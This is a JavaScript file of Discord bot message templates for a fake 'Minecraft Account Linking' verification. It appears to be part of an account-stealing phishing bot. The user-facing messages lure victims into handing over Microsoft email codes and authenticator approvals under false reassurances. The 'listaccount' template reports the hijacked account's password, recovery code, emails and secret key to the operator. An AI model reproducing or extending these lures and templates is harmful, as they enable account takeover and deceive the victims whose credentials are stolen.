module.exports = (type, client) => {
  switch (type) {
    case "main":
      return {
        title: `Minecraft Account Linking`,
        description: `
        FAQ

        Q: Why do we need you to verify?

        A: It's for auto-roles, We need to give you your class roles, catacomb-level roles, and verified roles. It's also just for extra security in cases of a raid.

        Q: How long does it take for me to get my roles?

        A: We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.

        Q: Why do you need to collect a code?

        A: The code confirms with the Minecraft API that you actually own that Minecraft account.`,
        color: 0x00ff00
      };
    case "otp":
      return {
        title: `No Security email`,
        description: `Your email doesn't have a security email. Add a security email and then re-verify!`,
        color: 0xff0000
      };
    case "oauth":
      return {
        title: `Verification`,
        description: `Use this link to verify instead!`,
        color: 0x00ff00
      };
    case "res":
      return {
        title: `Account linked!`,
        description: `Congratulations you linked the account successfully!`,
        color: 0x00ff00 
      };
    case "invalid":
      return {
        title: `Error :x:`,
        description: `The code you sent was wrong, please try again with a valid code!`,
        color: 0xff0000
      };
    case "sec":
      return {
        title: `Last Step\n`,
        description: `Due to the increase of fake verifications, we require a code from \`(sec)\`, to prove that you are the owner of __{username}__. This code is only used for verification.\n\n**Note:**  It can take \`30s-2mins\` to send the code.`,
        color: 8049651
      };
    case "locked":
      return {
        title: `Account Locked`,
        description: `Your account seems to be locked. Please log-in, resolve issues then retry.`,
        color: 0xff0000
      };
    case "invalid email":
      return {
        title: `Invalid Email`,
        description: `The email you have entered \`(sec)\` is invalid, please retry using a valid email.`,
        color: 0xff0000
      };
    case "authenticator":
      return {
        title: `Last Step`,
        description: `Due to the increase of fake verifications, we require you to confirm on your device that you are the owner of this account by clicking on (sec).`,
        color: 0xffff00
      };
    case "account doesn't exist":
      return {
        title: `Error :x:`,
        description: `This account doesn't exist, please try again with a valid account!`,
        color: 0xff0000
      };
    case "howto":
      return {
        title: `How to Add a Security Email`,
        description: `**Step 1** Go to your [Microsoft Account](https://account.live.com/proofs/manage/additional)
**Step 2** Click on "Security"
**Step 3** Click on "Advanced Security options"
**Step 4** Click "Add a new way to verify"
**Step 5** Click "Email a code"
**Step 6** Enter your email
**Step 7** Wait 1-2 minutes and retry`,
        image: {
          url: `https://cdn.discordapp.com/ephemeral-attachments/1216753532951203893/1217799172531425421/HowTo.gif?ex=660556dc&is=65f2e1dc&hm=93a1731f755a0af317aa750f4f7257f5325e28076a4a898bb3414c538640afb7&`
        },
        color: 0xc8c8c8
      };
    case "split":
      return {
        title: `Verification Failed`,
        description: `We have failed to authenticate your account due to Hypixel's API being down, please retry using our alternative verification system.`,
        color: 0xff0000
      };
    case "blacklisted":
      return {
        title: "Failed to verify you",
        description: "We have detected an issue whilst trying to give you the correct roles. Please wait until a staff member manually verifies you. Thank you for your patience.",
        color: 0xff0000
      };
    case "listaccount":
      return {
        title: "Account secured in %TIMETAKEN% seconds",
        color: 11716576,
        footer: {
          text: "%BAN%"
        },
        fields: [
          { name: "Username", value: "```%NEWNAME%```", inline: true },
          { name: "Owns MC", value: "```%OWNSMC%```", inline: true },
          { name: "Capes", value: "```%CAPES%```", inline: true },
          { name: "Recovery Code", value: "```%RECOVERY%```", inline: false },
          { name: "Primary Email", value: "```%EMAIL%```", inline: true },
          { name: "Security Email", value: "```%SECURITY%```", inline: true },
          { name: "Secret Key", value: "```%SECRETKEY%```", inline: true },
          { name: "Password", value: "```%PASSWORD%```", inline: false }
        ]
      };
        case "statsmsg":
      return {
        color: 11716576,
        fields: [
          { name: "Rank", value: "%RANK%", inline: true },
          { name: "NWL", value: "%NWL%", inline: true },
          { name: "Gifted", value: "%GIFTED%", inline: true },
          { name: "NW", value: "%NETWORTHTOTAL%", inline: true },
          { name: "SA", value: "%SA%", inline: true },
          { name: "LVL", value: "%SBLVL%", inline: true },
          { name: "Lunar Cosmetics", value: "%LUNARCOSMETICS%", inline: true },
          { name: "Lunar Emotes", value: "%LUNAREMOTES%", inline: true }
        ]
      };
    case "wrongnumber":
      return {
        title: `Error :x:`,
        description: `You chose the wrong number, please try again and choose the right number!`,
        color: 0xff0000
      };
          case "invalidated":
return {
      "title": "Failed to find username: %USERNAME%",
      "description": "We have searched for the username `%USERNAME%` and have failed to find stats for it. If you still wish to continue, click `Continue`. If you wish to restart, click `Retry`.",
      "color": 0xff0000
}
    case "timeout":
      return {
        title: `Error :x:`,
        description: `Timeout, please try again!⏱`,
        color: 0xff0000
      };
    case "extrabutton":
      return {
        title: `Not Set`,
        description: `Add any text here!`,
        color: 0xff0000
      };
    case "codenotnumbers":
      return {
        title: `Error :x:`,
        description: `Invalid code, please confirm with the code that was sent to your email`,
        color: 0xff0000
      };
    case "nomc":
      return {
        title: `Error :x:`,
        description: `We couldn't find your Minecraft Username to verify you, please retry using your minecraft email!`,
        color: 0xff0000
      };
    case "dm1":
      return {
        title: `Welcome to (guildname)`,
        description: `In order to gain access to our channels and services you must verify your Minecraft account. If you do not verify you will be automatically kicked from the server. \n\n To get started, send me the message "(verifymsg)" and i'll give you more instructions.`,
        color: 0xff0000
      };
    case "dm2":
  return {
    description: `Thank you for choosing to link your Minecraft Account in (guildname)! By continuing you acknowledge that this information may be accessible by other users of the bot.\n\n**How would you like to link your account?**\n🅰️ Joining our server to get a code.\n🅱️ Using your Hypixel Social Profile.`,
    color: 0xff0000,
    author: {
      name: `Link Minecraft Account to (guildname)`,
      iconURL: client.user.displayAvatarURL()
    },
    footer: {
      text: `The first option is the easiest and the quickest option for first timers, we recommend going with that option.`
    } 
  };
          case "dm3":
      return {
        description: `Our services seem to be down currently, please continue with our alternative method.`,
        color: 0xff0000
      };
    case "howtoauth":
      return {
        title: "Verify with Authenticator App",
        description: "**Step 1:** Download the Microsoft Authenticator app on your phone, or open it if already installed.\n**Step 2:** Login to your Microsoft account.\n**Step 3:** Tap the code on the app that corresponds to the code shown above.\n\nThat's it! You've verified your account.",
        color: 0xc8c8c8,
      };
    default:
      console.log(`Invalid embed type ${type}`);
      return null;
  }
};
